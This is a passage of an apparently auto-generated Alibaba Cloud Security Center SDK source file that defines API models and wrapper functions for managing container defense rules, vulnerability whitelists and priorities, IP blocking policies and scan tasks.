- false: Do not delete', example='true'),
  vendor?: string(name='Vendor', description='Cloud asset vendor. Values:

- **Tencent**: Tencent Cloud
- **AWS**: AWS

This parameter is required.', example='Tencent'),
}

model ModifyCloudVendorTrialConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for the request, which can be used to troubleshoot and pinpoint issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0D****'),
}

model ModifyCloudVendorTrialConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCloudVendorTrialConfigResponseBody(name='body'),
}

/**
 * @summary Modify the Trail configuration information for the AK
 *
 * @param request ModifyCloudVendorTrialConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCloudVendorTrialConfigResponse
 */
async function modifyCloudVendorTrialConfigWithOptions(request: ModifyCloudVendorTrialConfigRequest, runtime: Util.RuntimeOptions): ModifyCloudVendorTrialConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authId)) {
    query['AuthId'] = request.authId;
  }
  if (!Util.isUnset(request.authInfo)) {
    query['AuthInfo'] = request.authInfo;
  }
  if (!Util.isUnset(request.deleteTrail)) {
    query['DeleteTrail'] = request.deleteTrail;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCloudVendorTrialConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modify the Trail configuration information for the AK
 *
 * @param request ModifyCloudVendorTrialConfigRequest
 * @return ModifyCloudVendorTrialConfigResponse
 */
async function modifyCloudVendorTrialConfig(request: ModifyCloudVendorTrialConfigRequest): ModifyCloudVendorTrialConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCloudVendorTrialConfigWithOptions(request, runtime);
}

model ModifyClusterCnnfStatusUserConfirmRequest {
  clusterIds?: [ string ](name='ClusterIds', description='The cluster IDs.'),
  userConfirm?: boolean(name='UserConfirm', description='Specifies whether to fix the blocking status of the cluster. Valid values:

*   true: yes
*   false: no', example='true'),
}

model ModifyClusterCnnfStatusUserConfirmResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4FFBEDBD-FA63-5213-9103-306519EE4857'),
}

model ModifyClusterCnnfStatusUserConfirmResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyClusterCnnfStatusUserConfirmResponseBody(name='body'),
}

/**
 * @summary Fixes the blocking status of clusters whose status is Normal to be confirmed.
 *
 * @param request ModifyClusterCnnfStatusUserConfirmRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyClusterCnnfStatusUserConfirmResponse
 */
async function modifyClusterCnnfStatusUserConfirmWithOptions(request: ModifyClusterCnnfStatusUserConfirmRequest, runtime: Util.RuntimeOptions): ModifyClusterCnnfStatusUserConfirmResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.userConfirm)) {
    query['UserConfirm'] = request.userConfirm;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClusterCnnfStatusUserConfirm',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Fixes the blocking status of clusters whose status is Normal to be confirmed.
 *
 * @param request ModifyClusterCnnfStatusUserConfirmRequest
 * @return ModifyClusterCnnfStatusUserConfirmResponse
 */
async function modifyClusterCnnfStatusUserConfirm(request: ModifyClusterCnnfStatusUserConfirmRequest): ModifyClusterCnnfStatusUserConfirmResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClusterCnnfStatusUserConfirmWithOptions(request, runtime);
}

model ModifyConcernNecessityRequest {
  concernNecessity?: string(name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low', example='asap,nntf'),
}

model ModifyConcernNecessityResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='F059E190-A65B-5DF8-8709-2CC7791A5B65'),
}

model ModifyConcernNecessityResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyConcernNecessityResponseBody(name='body'),
}

/**
 * @summary Modifies the priority to fix vulnerabilities.
 *
 * @param request ModifyConcernNecessityRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyConcernNecessityResponse
 */
async function modifyConcernNecessityWithOptions(request: ModifyConcernNecessityRequest, runtime: Util.RuntimeOptions): ModifyConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.concernNecessity)) {
    query['ConcernNecessity'] = request.concernNecessity;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the priority to fix vulnerabilities.
 *
 * @param request ModifyConcernNecessityRequest
 * @return ModifyConcernNecessityResponse
 */
async function modifyConcernNecessity(request: ModifyConcernNecessityRequest): ModifyConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyConcernNecessityWithOptions(request, runtime);
}

model ModifyContainerDefenseRuleRequest {
  description?: string(name='Description', description='The description of the rule.', example='Prevent non-mirror programs from starting in containers'),
  ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the [ListContainerDefenseRule](https://help.aliyun.com/document_detail/2590599.html) operation to query the IDs of rules.', example='123'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='text-001'),
  ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   1: system rule
*   2: custom rule', example='1'),
  scope?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster on which the rule takes effect.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c54b***1501'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
    }
  ](name='Scope', description='The effective scope of the rule.'),
  whitelist?: {
    hash?: [ string ](name='Hash', description='The hash values of the files that need to be added to the whitelist.

>  This parameter is not supported.', deprecated=true),
    image?: [ string ](name='Image', description='The images that need to be added to the whitelist.'),
    path?: [ string ](name='Path', description='The paths to the files that need to be added to the whitelist.'),
  }(name='Whitelist', description='The whitelist.'),
}

model ModifyContainerDefenseRuleShrinkRequest {
  description?: string(name='Description', description='The description of the rule.', example='Prevent non-mirror programs from starting in containers'),
  ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the [ListContainerDefenseRule](https://help.aliyun.com/document_detail/2590599.html) operation to query the IDs of rules.', example='123'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='text-001'),
  ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   1: system rule
*   2: custom rule', example='1'),
  scope?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster on which the rule takes effect.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c54b***1501'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
    }
  ](name='Scope', description='The effective scope of the rule.'),
  whitelistShrink?: string(name='Whitelist', description='The whitelist.'),
}

model ModifyContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: long(name='Data', description='The ID of the rule that was modified.', example='100'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The value 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='768DFBE5-*A5DC35**'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='True'),
}

model ModifyContainerDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyContainerDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Modifies a rule for non-image program defense.
 *
 * @param tmpReq ModifyContainerDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyContainerDefenseRuleResponse
 */
async function modifyContainerDefenseRuleWithOptions(tmpReq: ModifyContainerDefenseRuleRequest, runtime: Util.RuntimeOptions): ModifyContainerDefenseRuleResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyContainerDefenseRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.whitelist)) {
    request.whitelistShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.whitelist, 'Whitelist', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.description)) {
    query['Description'] = request.description;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.scope)) {
    query['Scope'] = request.scope;
  }
  if (!Util.isUnset(request.whitelistShrink)) {
    query['Whitelist'] = request.whitelistShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyContainerDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a rule for non-image program defense.
 *
 * @param request ModifyContainerDefenseRuleRequest
 * @return ModifyContainerDefenseRuleResponse
 */
async function modifyContainerDefenseRule(request: ModifyContainerDefenseRuleRequest): ModifyContainerDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyContainerDefenseRuleWithOptions(request, runtime);
}

model ModifyContainerDefenseRuleSwitchRequest {
  ruleIds?: [ long ](name='RuleIds', description='The IDs of the rules.'),
  ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='0'),
}

model ModifyContainerDefenseRuleSwitchResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: long(name='Data', description='The number of entries returned.', example='30'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='C8A137FB-6E18-5741-9B47-D9A0EBA3495F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ModifyContainerDefenseRuleSwitchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyContainerDefenseRuleSwitchResponseBody(name='body'),
}

/**
 * @summary Changes the status of non-image program defense rules.
 *
 * @param request ModifyContainerDefenseRuleSwitchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyContainerDefenseRuleSwitchResponse
 */
async function modifyContainerDefenseRuleSwitchWithOptions(request: ModifyContainerDefenseRuleSwitchRequest, runtime: Util.RuntimeOptions): ModifyContainerDefenseRuleSwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyContainerDefenseRuleSwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the status of non-image program defense rules.
 *
 * @param request ModifyContainerDefenseRuleSwitchRequest
 * @return ModifyContainerDefenseRuleSwitchResponse
 */
async function modifyContainerDefenseRuleSwitch(request: ModifyContainerDefenseRuleSwitchRequest): ModifyContainerDefenseRuleSwitchResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyContainerDefenseRuleSwitchWithOptions(request, runtime);
}

model ModifyContainerPluginRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  mode?: int32(name='Mode', description='The action mode of the rule. Valid values:

*   **1**: alerts
*   **2**: block', example='1'),
  ruleId?: int32(name='RuleId', description='The ID of the rule.

This parameter is required.', example='100012'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **0**: user-defined rule
*   **1**: built-in rule', example='0'),
  selectedPolicy?: [ string ](name='SelectedPolicy', description='The rule items.'),
  whiteImages?: [ string ](name='WhiteImages', description='The images that are added to the whitelist.'),
}

model ModifyContainerPluginRuleResponseBody = {
  data?: {
    ruleId?: long(name='RuleId', description='The ID of the rule.', example='600640'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test555'),
    switchId?: string(name='SwitchId', description='The switch ID.', example='USER-CONTAINER-RULE-SWITCH-TYPE_xxx'),
  }(name='Data', description='The defense rule against container escapes.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model ModifyContainerPluginRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyContainerPluginRuleResponseBody(name='body'),
}

/**
 * @summary Modifies the defense rule against container escapes.
 *
 * @param request ModifyContainerPluginRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyContainerPluginRuleResponse
 */
async function modifyContainerPluginRuleWithOptions(request: ModifyContainerPluginRuleRequest, runtime: Util.RuntimeOptions): ModifyContainerPluginRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.selectedPolicy)) {
    query['SelectedPolicy'] = request.selectedPolicy;
  }
  if (!Util.isUnset(request.whiteImages)) {
    query['WhiteImages'] = request.whiteImages;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyContainerPluginRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the defense rule against container escapes.
 *
 * @param request ModifyContainerPluginRuleRequest
 * @return ModifyContainerPluginRuleResponse
 */
async function modifyContainerPluginRule(request: ModifyContainerPluginRuleRequest): ModifyContainerPluginRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyContainerPluginRuleWithOptions(request, runtime);
}

model ModifyContainerScanConfigRequest {
  appNames?: string(name='AppNames', description='The name of the container application.', example='[\\\\"logtail-ds\\\\",\\\\"alicloud-monitor-controller\\\\",\\\\"storage-snapshot-manager\\\\"]'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='cfb7a55a81f7246b5ac18845ea79a****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ModifyContainerScanConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='BFF355BC-8A40-55F3-8CBC-CC3E9DAC****'),
}

model ModifyContainerScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyContainerScanConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of vulnerability scan for a running container.
 *
 * @param request ModifyContainerScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyContainerScanConfigResponse
 */
async function modifyContainerScanConfigWithOptions(request: ModifyContainerScanConfigRequest, runtime: Util.RuntimeOptions): ModifyContainerScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appNames)) {
    query['AppNames'] = request.appNames;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyContainerScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of vulnerability scan for a running container.
 *
 * @param request ModifyContainerScanConfigRequest
 * @return ModifyContainerScanConfigResponse
 */
async function modifyContainerScanConfig(request: ModifyContainerScanConfigRequest): ModifyContainerScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyContainerScanConfigWithOptions(request, runtime);
}

model ModifyCreateVulWhitelistRequest {
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='This vulnerability is not harmful'),
  targetInfo?: string(name='TargetInfo', description='The applicable scope of the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the type of the applicable scope. Valid values:

    *   **GroupId**: the ID of a server group.
    *   **Uuid**: the UUID of a server.

*   **uuids**: the UUIDs of servers. This field is of the string type.

*   **groupIds**: the IDs of server groups. This field is of the long type.

>  If you leave this parameter empty, the applicable scope is all servers. If you set the **type** field to **GroupId**, you must also specify the **groupIds** field. If you set the **type** field to **Uuid**, you must also specify the **uuids** field.', example='{"type":"Uuid","uuids":["b31a708f-5fea-426e-bebe-a7b0893****","1f749687-3b5d-4e11-8140-d964673****"],"groupIds":[]}'),
  whitelist?: string(name='Whitelist', description='The information about the vulnerability that you want to add to the whitelist. The value is a JSON string that contains the following fields:

*   **Status**: the status of the vulnerability.

*   **GmtLast**: the timestamp when the vulnerability was last detected. Unit: milliseconds.

*   **LaterCount**: the number of vulnerabilities that have the medium priority.

*   **AsapCount**: the number of vulnerabilities that have the high priority.

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **Related**: the Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.

*   **HandledCount**: the number of handled vulnerabilities.

*   **AliasName**: the alias of the vulnerability.

*   **RuleModifyTime**: the time when the vulnerability was last disclosed.

*   **NntfCount**: the number of vulnerabilities that have the low priority.

*   **TotalFixCount**: the total number of fixed vulnerabilities.

*   **Tags**: the tag that is added to the vulnerability.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to query the information about the vulnerability that you want to add to the whitelist.

This parameter is required.', example='[{"Status":0,"GmtLast":1662281929000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20172836","Type":"cve","Related":"CVE-2017-14491,CVE-2017-14492,CVE-2017-14493,CVE-2017-14494,CVE-2017-14495,CVE-2017-14496","HandledCount":1,"AliasName":"RHSA-2017:2836-Critical: dnsmasq security update","RuleModifyTime":1535542395000,"NntfCount":0,"TotalFixCount":196668,"Tags":"Exploit Exists,Code Execution"},{"Status":0,"GmtLast":1662281933000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20173075","Type":"cve","Related":"CVE-2017-13089,CVE-2017-13090","HandledCount":1,"AliasName":"RHSA-2017:3075-Important: wget security update","RuleModifyTime":1551432867000,"NntfCount":0,"TotalFixCount":369136,"Tags":"Code Execution"}]'),
}

model ModifyCreateVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6B23A612-D997-5176-8C3B-D640DFD65772'),
  vulWhitelistList?: [ 
    {
      id?: long(name='Id', description='The ID of the whitelist.', example='30376'),
    }
  ](name='VulWhitelistList', description='An array that consists of the information about the whitelist.'),
}

model ModifyCreateVulWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCreateVulWhitelistResponseBody(name='body'),
}

/**
 * @summary Adds vulnerabilities to the whitelist. After you add the vulnerabilities to the whitelist, Security Center no longer generates alerts for the vulnerabilities.
 *
 * @param request ModifyCreateVulWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCreateVulWhitelistResponse
 */
async function modifyCreateVulWhitelistWithOptions(request: ModifyCreateVulWhitelistRequest, runtime: Util.RuntimeOptions): ModifyCreateVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCreateVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds vulnerabilities to the whitelist. After you add the vulnerabilities to the whitelist, Security Center no longer generates alerts for the vulnerabilities.
 *
 * @param request ModifyCreateVulWhitelistRequest
 * @return ModifyCreateVulWhitelistResponse
 */
async function modifyCreateVulWhitelist(request: ModifyCreateVulWhitelistRequest): ModifyCreateVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCreateVulWhitelistWithOptions(request, runtime);
}

model ModifyCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to specify in the policy.

This parameter is required.', example='10.12.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound

This parameter is required.', example='out'),
  expireTime?: long(name='ExpireTime', description='The expiration time of the policy.

This parameter is required.', example='1940899881000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', description='The UUIDs of servers.

This parameter is required.', example='2516fe4f-adb6-45d1-87a7-90ce1213****,30746836-68d0-47f6-8b2d-c93150da****,7c3ac531-077b-46b8-8706-5c8d4e73****'),
}

model ModifyCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EE4B1F-CEF8-5A75-86D3-D012CB3D****'),
}

model ModifyCustomBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCustomBlockRecordResponseBody(name='body'),
}

/**
 * @summary Modifies a custom IP address blocking policy.
 *
 * @param request ModifyCustomBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCustomBlockRecordResponse
 */
async function modifyCustomBlockRecordWithOptions(request: ModifyCustomBlockRecordRequest, runtime: Util.RuntimeOptions): ModifyCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a custom IP address blocking policy.
 *
 * @param request ModifyCustomBlockRecordRequest
 * @return ModifyCustomBlockRecordResponse
 */
async function modifyCustomBlockRecord(request: ModifyCustomBlockRecordRequest): ModifyCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCustomBlockRecordWithOptions(request, runtime);
}

model ModifyCycleTaskRequest {
  configId?: string(name='ConfigId', description='The ID of the task configuration.

>  You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.

This parameter is required.', example='00cfa8161da093089e6804ba6a33****'),
  enable?: int32(name='Enable', description='Specifies whether to enable the task. Valid values:

*   **1**: enables the task.
*   **0**: disables the task.', example='1'),
  firstDateStr?: long(name='FirstDateStr', description='The time when the task first started.', example='1664380800000'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The interval at which the task is run.', example='14'),
  param?: string(name='Param', description='The additional information.', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**', example='day'),
  targetEndTime?: int32(name='TargetEndTime', description='The end time of the task. The time must be a time frame.', example='6'),
  targetStartTime?: int32(name='TargetStartTime', description='The start time of the task. The start time must be a time frame.', example='0'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus detection task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

Valid values:

*   VIRUS_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    virus detection task

    <!-- -->

*   IMAGE_SCAN

    <!-- -->

    :

    <!-- -->

    image scan task

    <!-- -->

*   EMG_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    urgent vulnerability scan task

